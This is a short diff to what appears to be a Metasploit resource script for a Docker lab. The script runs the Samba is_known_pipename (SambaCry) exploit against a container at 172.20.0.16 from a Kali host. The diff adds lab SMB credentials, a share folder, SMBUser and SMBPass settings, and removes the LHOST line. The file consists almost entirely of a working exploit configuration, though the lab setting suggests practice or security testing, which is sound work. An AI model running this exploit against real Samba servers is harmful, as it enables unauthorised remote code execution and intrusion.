@@ -4,9 +4,12 @@
 # Prerequisites:
 #   - samba container running (docker compose up -d samba)
 #   - Kali on 172.20.0.5
+# Credentials: sambacry:nosambanocry
 
 use exploit/linux/samba/is_known_pipename
 set RHOSTS 172.20.0.16
 set SMB_SHARE_NAME data
-set LHOST 172.20.0.5
+set SMB_FOLDER /
+set SMBUser sambacry
+set SMBPass nosambanocry
 exploit
